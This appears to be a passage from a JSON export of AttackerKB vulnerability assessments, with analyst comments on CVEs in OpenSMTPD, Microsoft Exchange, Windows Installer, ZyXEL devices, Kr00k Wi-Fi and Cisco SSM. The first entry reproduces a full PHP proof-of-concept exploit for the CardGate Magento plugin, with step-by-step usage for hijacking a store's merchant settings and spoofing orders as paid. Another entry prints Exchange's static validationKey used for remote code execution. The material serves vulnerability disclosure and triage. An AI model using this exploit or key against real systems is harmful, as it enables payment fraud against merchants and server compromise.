      "document": "This is related to https://attackerkb.com/topics/cve-2020-8819 It is the same plugin for a different platform and is vulnerable to the same \r\n\r\nMagento does not provide an indication of how many websites have the plugins installed, but using the WooCommerce as a guide it is expected to be relatively low ~ 500 installs.\r\n\r\nPOC code is available in the github repo as part of the disclosure and is replicated at the end of this analysis for convenience. \r\n\r\nAt the time of this analysis, the Magento MarketPlace was still serving a vulnerable version. 2.0.30 - https://marketplace.magento.com/cardgate-magento2.html\r\n\r\n```php\r\n<?php\r\n/*\r\n  Usage:\r\n\r\n  1. Change values of the constants (see below for TARGET & ORDER*)\r\n  2. Host this script somewhere (must be public accessible)\r\n  3. Register a merchant at https://cardgate.com\r\n  4. Sign into \"My CardGate\" dashboard\r\n  5. Add fake site or choose existing one\r\n  6. Click \"Setup your Webshop\" button in site preferences\r\n  7. Paste the URL of this script into the pop-up window and click \"Save\"\r\n  8. The target store now uses the settings of your site, enjoy :]\r\n\r\n  P.S. It works perfectly in both Staging and Live modes, regardless of the current mode of the target shop.\r\n*/\r\n\r\n// -------- Options (start) --------\r\ndefine('TARGET', 'http://domain.tld'); // without trailing slash, pls\r\ndefine('ORDER', '000000001'); // provide non-zero value to automagically spoof order status\r\ndefine('ORDER_AMOUNT', 1.00); // provide a valid total (to bypass built-in fraud protection)\r\ndefine('ORDER_CURRENCY', 'USD'); // provide a valid currency (same goal as above)\r\ndefine('ORDER_PAYMENT_TYPE', 'sofortbanking'); // provide a valid payment type slug (optional)\r\n// --------- Options (end) ---------\r\n\r\ndefine('API_STAGING', 'https://secure-staging.curopayments.net/rest/v1/curo/');\r\ndefine('API_PRODUCTION', 'https://secure.curopayments.net/rest/v1/curo/');\r\n\r\n/**\r\n * Original function from CardGate API client library (SDK) with minor changes\r\n * @param string $sToken_ \r\n * @param bool $bTestmode_ \r\n * @return string\r\n */\r\nfunction pullConfig($sToken_, $bTestmode_ = FALSE) {\r\n\tif (!is_string($sToken_)) {\r\n\t\tthrow new Exception('invalid token for settings pull: ' . $sToken_);\r\n\t}\r\n\r\n\t$sResource = \"pullconfig/{$sToken_}/\";\r\n\t$sUrl = ($bTestmode_ ? API_STAGING : API_PRODUCTION) . $sResource;\r\n\r\n\t$rCh = curl_init();\r\n\tcurl_setopt($rCh, CURLOPT_URL, $sUrl);\r\n\tcurl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($rCh, CURLOPT_TIMEOUT, 60);\r\n\tcurl_setopt($rCh, CURLOPT_HEADER, FALSE);\r\n\tcurl_setopt($rCh, CURLOPT_HTTPHEADER, [\r\n\t\t'Content-Type: application/json',\r\n\t\t'Accept: application/json'\r\n\t]);\r\n\tif ($bTestmode_) {\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);\r\n\t} else {\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, TRUE);\r\n\t\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 2);\r\n\t}\r\n\r\n\tif (FALSE == ($sResults = curl_exec($rCh))) {\r\n\t\t$sError = curl_error($rCh);\r\n\t\tcurl_close($rCh);\r\n\t\tthrow new Exception('Client.Request.Curl.Error: ' . $sError);\r\n\t} else {\r\n\t\tcurl_close($rCh);\r\n\t}\r\n\tif (NULL === ($aResults = json_decode($sResults, TRUE))) {\r\n\t\tthrow new Exception('remote gave invalid JSON: ' . $sResults);\r\n\t}\r\n\tif (isset($aResults['error'])) {\r\n\t\tthrow new Exception($aResults['error']['message']);\r\n\t}\r\n\r\n\treturn $aResults;\r\n}\r\n\r\n/**\r\n * Original function from CardGate API client library (SDK) with minor changes\r\n * @param string $sUrl \r\n * @param array $aData_ \r\n * @param string $sHttpMethod_ \r\n * @return string\r\n */\r\nfunction doRequest($sUrl, $aData_ = NULL, $sHttpMethod_ = 'POST') {\r\n\tif (!in_array($sHttpMethod_, ['GET', 'POST'])) {\r\n\t\tthrow new Exception('invalid http method: ' . $sHttpMethod_);\r\n\t}\r\n\r\n\t$rCh = curl_init();\r\n\tcurl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($rCh, CURLOPT_TIMEOUT, 60);\r\n\tcurl_setopt($rCh, CURLOPT_HEADER, FALSE);\r\n\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);\r\n\tcurl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);\r\n\r\n\tif ('POST' == $sHttpMethod_) {\r\n\t\tcurl_setopt($rCh, CURLOPT_URL, $sUrl);\r\n\t\tcurl_setopt($rCh, CURLOPT_POST, TRUE);\r\n\t\tcurl_setopt($rCh, CURLOPT_POSTFIELDS, http_build_query($aData_));\r\n\t} else {\r\n\t\t$sUrl = $sUrl\r\n\t\t\t. (FALSE === strchr($sUrl, '?') ? '?' : '&')\r\n\t\t\t. http_build_query($aData_)\r\n\t\t;\r\n\t\tcurl_setopt($rCh, CURLOPT_URL, $sUrl);\r\n\t}\r\n\r\n\t$response = curl_exec($rCh);\r\n\tif (FALSE == $response) {\r\n\t\t$sError = curl_error($rCh);\r\n\t\tcurl_close($rCh);\r\n\t\tthrow new Exception('Client.Request.Curl.Error: ' . $sError);\r\n\t} else {\r\n\t\tcurl_close($rCh);\r\n\t}\r\n\r\n\treturn $response;\r\n}\r\n\r\nif (!empty($_REQUEST['cgp_sitesetup']) && !empty($_REQUEST['token'])) {\r\n\ttry {\r\n\t\t$aResult = pullConfig($_REQUEST['token'], $_REQUEST['testmode']);\r\n\t\t$aConfigData = $aResult['pullconfig']['content'];\r\n\t\t$response = doRequest(TARGET . '/cardgate/payment/callback', $_REQUEST, 'GET');\r\n\t\tif ($response == $aConfigData['merchant_id'] . '.' . $aConfigData['site_id'] . '.200') {\r\n\t\t\tif (ORDER) {\r\n\t\t\t\t$payload = [\r\n\t\t\t\t\t'testmode' => $_REQUEST['testmode'],\r\n\t\t\t\t\t'reference' => ORDER,\r\n\t\t\t\t\t'transaction' => 'T' . str_pad(time(), 11, random_int(0, 9)),\r\n\t\t\t\t\t'currency' => ORDER_CURRENCY,\r\n\t\t\t\t\t'amount' => ORDER_AMOUNT * 100,\r\n\t\t\t\t\t'status' => 'success',\r\n\t\t\t\t\t'code' => 200,\r\n\t\t\t\t\t'pt' => ORDER_PAYMENT_TYPE\r\n\t\t\t\t];\r\n\t\t\t\t$payload['hash'] = md5(\r\n\t\t\t\t\t(!empty($payload['testmode']) ? 'TEST' : '')\r\n\t\t\t\t\t. $payload['transaction']\r\n\t\t\t\t\t. $payload['currency']\r\n\t\t\t\t\t. $payload['amount']\r\n\t\t\t\t\t. $payload['reference']\r\n\t\t\t\t\t. $payload['code']\r\n\t\t\t\t\t. $aConfigData['site_key']\r\n\t\t\t\t);\r\n\t\t\t\t$response = doRequest(TARGET . '/cardgate/payment/callback', $payload, 'GET');\r\n\t\t\t\tif ($response == $payload['transaction'] . '.' . $payload['code']) {\r\n\t\t\t\t\tdie($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');\r\n\t\t\t\t} else {\r\n\t\t\t\t\tthrow new Exception(\"Unable to spoof order status, but merchant settings was updated successfully ($response)\");\t\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\tdie($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tthrow new Exception(\"It seems target is not vulnerable ($response)\");\r\n\t\t}\r\n\t} catch (\\Exception $oException_) {\r\n\t\tdie(htmlspecialchars($oException_->getMessage()));\r\n\t}\r\n}\r\n\r\n```",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "6d023025-0422-4aff-bb6a-ce20413fc29a",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "3ad038d6-fd62-410a-8040-5d713ffad474",
      "created": "2020-02-25T23:23:55.266384Z",
      "revisionDate": "2020-02-26T01:05:31.01207Z",
      "document": "Exploit: https://github.com/rapid7/metasploit-framework/pull/12889.",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "432ea0aa-7faf-49a4-9449-1b93ce2cdd8e",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "5f523422-6520-4801-9309-b6e12a00a1c9",
      "created": "2020-02-26T01:04:37.278536Z",
      "revisionDate": "2020-02-28T13:44:28.222092Z",
      "document": "> If such a remote\r\n  server is controlled by an attacker (either because it is malicious or\r\n  compromised, or because of a man-in-the-middle, DNS, or BGP attack --\r\n  SMTP is not TLS-encrypted by default), then the attacker can execute\r\n  arbitrary shell commands on the vulnerable OpenSMTPD installation.\r\n\r\nThis seems to be the primary limitation for exploitation. You can't just give OpenSMTPD an IP address. You need to control an MX host or relay, so a little more setup is required. Contrast this with CVE-2020-7247, which is directly exploitable against the server.",
      "score": 4,
      "metadata": {},
      "tags": []
    },
    {
      "id": "8121bd3b-dd77-4401-ba72-c0b36a6a39c9",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "3ad038d6-fd62-410a-8040-5d713ffad474",
      "created": "2020-02-26T01:05:23.500356Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Expect that this may be the first in a string of OpenSMTP vulnerabilities (now that there's increased scrutiny, not because I have any kind of insider knowledge), but that the results of this vulnerability will probably be an improvement in OpenSMTP's design as a result, since bug classes like this tend to get the OpenBSD developers working hard to find general solutions in subsequent releases.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c2b810ea-1644-49f7-a197-1c2073746734",
      "editorId": "62094807-a275-4fc3-ba9d-3e39896e8c05",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-02-26T02:30:27.611496Z",
      "revisionDate": "2020-07-10T13:27:14.513792Z",
      "document": "This one is fairly new. I will put a few quotes in here as they display my ideas of why this should be considered high priority and have better writing skills than I do, unfortunately. \r\nI was initially alerted (again) to this CVE with the Thread linked here : https://twitter.com/GossiTheDog/status/1232368620270911488\r\nI agree, enterprise environments with Internet facing Exchange. As stated in the thread, you can see a simple search with shodan.io will expose this vulnerability. There are thousands that qualify. \r\n\r\nHere is another, more formal and thorough analysis I think you will find helpful: https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\r\n\r\nHere is a video of bug in action. \r\nhttps://youtu.be/7d_HoQ0LVy8\r\n\r\nThis is a RCE vulnerability that effects Microsoft Exchange Server. Now a patch was released, but Microsoft has not classified this as critical, so we will see how effective it is. \r\n\r\n\"Instead of having randomly-generated keys on a per-installation basis, all installations of Microsoft Exchange Server have the same validationKey and decryptionKey values in web.config. These keys are used to provide security for ViewState. ViewState is server-side data that ASP.NET web applications store in serialized format on the client. The client provides this data back to the server via the __VIEWSTATE request parameter. \"\r\n\r\nI welcome any discussion, please tell me if I missing something. I would love to hear more about this and if any Blue Team has had an incident already. \r\nTake care!",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "common_enterprise",
          "difficult_to_patch"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "cbda0280-fe59-4f3e-8bb4-b300ea464b25",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-02-26T17:02:20.412624Z",
      "revisionDate": "2020-11-11T13:47:27.2924Z",
      "document": "This is a serialization bug in the Exchange Control Panel component of the Microsoft Exchange server. The [write up](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys) by ZDI outlines an exploitation path in grate detail how the vulnerability would be leveraged to gain command execution as `NT_AUTHORITY\\SYSTEM` on the server.\r\n\r\nThe root of the issue is that the `validationKey` is not randomized at installation time, resulting in Exchange servers using an attacker known value. This value can be used to submit crafted data to the server that passes validation checks and is ultimately deserialized which can result in code execution.\r\n\r\nThe important values from the write up are:\r\n``` \r\nvalidationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\r\nvalidationalg = SHA1\r\n```\r\n\r\nI anticipate that the largest barrier to developing a PoC for this will be setting up and configuring a target environment. Exploiting this vulnerability requires authenticating as a user. The user must be a member of the `Domain Users` group and have a configured mailbox in Exchange.\r\n\r\nThe ViewState must be transferred within a GET request, POST can not be used. This introduces size restrictions on the OS command that can be executed.",
      "score": 9,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a8484294-76c3-46c9-9778-f4f95f581910",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "8f90c40d-1f73-4df2-8155-8383b0b1daa1",
      "created": "2020-02-26T19:03:41.875477Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is a privilege escalation vulnerability in Windows Installer and, since the proof of concept is public, this is considered as important.\r\n\r\nThe issue is due to an incorrect impersonation when setting the DACLs and writing to a file. Windows Installer performs these operations with SYSTEM privileges, even if started by an unprivileged user. By creating the proper symbolic links and winning a race condition, it is possible to take full control of any restricted file and escalate privileges.\r\n\r\nNote that the current PoC is not weaponized, but it won't take too long to add the proper payload.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e6de1802-320e-4959-a789-68d031ff4a59",
      "editorId": "62094807-a275-4fc3-ba9d-3e39896e8c05",
      "topicId": "6b3d1206-72db-4bea-a98f-4117e0936c39",
      "created": "2020-02-26T23:18:54.731382Z",
      "revisionDate": "2020-08-28T18:03:55.41588Z",
      "document": "\" Multiple ZyXEL devices achieve authentication by using the weblogin.cgi CGI executable. This program fails to properly sanitize the username parameter that is passed to it. If the username parameter contains certain characters, it can allow command injection with the privileges of the web server that runs on the ZyXEL device. Although the web server does not run as the root user, many ZyXEL devices include a setuid utility that can be leveraged to run any command with root privileges. As such, it should be assumed that exploitation of this vulnerability can lead to remote code execution with root privileges.\r\n\r\nExploit code for this vulnerability that targets NAS devices is available on the internet. \"\r\n\r\nExploits are available. What interests me is this shodan.io search posted with 138,000+ devices still vulnerable. A firmware update has been released for most versions of device however, \" Block access to the ZyXEL device web interface \" is the advice for remaining or an alternative. \r\nHere is the shodan search I put in as a reference for the topic as well. Again, you're expert opinion is much more valuable than mine at this early stage. I am unfortunately unable to test these in my lab environment due to other commitments. \r\n\r\nedit: I might be mistaken CVE-2020-9054 is listed as the exploit here: https://kb.cert.org/artifacts/cve-2020-9054.html\r\n\r\nhttps://beta.shodan.io/search?query=ssl.cert.subject.CN%3Ausg\r\nhttps://www.nist.gov/fusion-search?s=CVE-2020-9054\r\nhttps://twitter.com/wdormann/status/1231987991473602561",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "common_enterprise"
        ],
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "2c1a2d75-3946-4875-883c-852ec0418b87",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "e144ddf5-ba54-49fb-b30b-34ff2b8b7f5e",
      "created": "2020-02-27T14:53:53.939377Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "The TL;DR from the technical whitepaper found here: https://www.welivesecurity.com/wp-content/uploads/2020/02/ESET_Kr00k.pdf\r\n\r\n If there are outbound TX queue packets for certain common WiFi devices, and a disassociation management packet is sent, the device will clear the encryption key to all zeros, and send the remaining packet data in the queue with that hardcoded key. If an attacker can send diassociate packets and then listen for any residual data frames, they can decrypt whatever traffic remains in the TX queue on those devices, which may be a few hundred packets depending on the data rate involved.\r\n\r\nWhile this seems like a real risk, I'm firmly in the camp that relying on the physical layer in the first place for data protection is misguided, and that really end-to-end security is still the only way to - Wifi has proven over and over to be a weak security boundary. By the time this is wide-spread fixed, we'll all be using DNS-over-HTTPS by force from browsers anyway. So, from an end-point consumer PoV, this isn't a big deal. Not any worse that connecting to that unencrypted hotel network you may have used earlier.\r\n\r\nSome potential future vuln predictions here: https://twitter.com/vanhoefm/status/1232738451587555328\r\n\r\nThinking through situations where an attacker might find this useful would be in physically accessing business-local OT networks, like point-of-sale, manufacturing, or other squishy-on-the-inside networks. Expect to see this show up in the next Wifi Pineapple release or in your next pen test physical engagement report.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "difficult_to_exploit"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "026c7a67-3156-405e-a9a3-f1a0be9da3e9",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "8e8b3aa3-02e0-4b8b-ae36-6c05936df558",
      "created": "2020-02-28T14:29:50.711567Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This vulnerability only exists if the High Availability (HA) service of Cisco Smart Software Manager On-Prem is enabled, which is not by default. This service enables an attacker to authenticate using a high-privilege default account with a static password (hardcoded). This attack could be executed by anyone without any specific skills, all he has to do is to authenticate using the default password, and no valid login is even required.\r\n\r\nThis looks like a critical vulnerability, since you can have access (read and write) to the system's data and change configurations. However, it looks like the level of privileges would not grant access to the sensitive parts of the system. So, that said, and considering the affected service is not enabled by default, it does not look that critical.\r\n\r\nThis requires more investigation to understand what can be done with this level of privileges. I did a very quick search on the internet and was not able to find this default password. Some patch reversing might need to be done to find it and start investigating.\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "26e50105-0fe5-4e2f-97d1-99d055feb9e6",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "002b2909-ca49-40c4-8969-be9be7b7947f",
      "created": "2020-02-28T16:20:24.015747Z",
      "revisionDate": "2020-02-28T16:20:24.017585Z",
      "document": "note: CVE owner here.\r\n\r\nthis vulnerability doesn't have so much value today because the product has been discontinued and aerohive has been acquired. all MSP are now moving to extreme cloud platform.\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "5a7e4ccf-3765-4796-bb8d-a0082daf95d0",
      "editorId": "18035361-11dc-4f8a-aa00-3da439abb02e",
      "topicId": "ea90a258-8e7f-49cd-a730-6d8457a421d7",
      "created": "2020-02-28T16:26:42.527367Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This vulnerability is very easy to exploit - without the need for any tools specialized for this attack.\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    }
  ]
}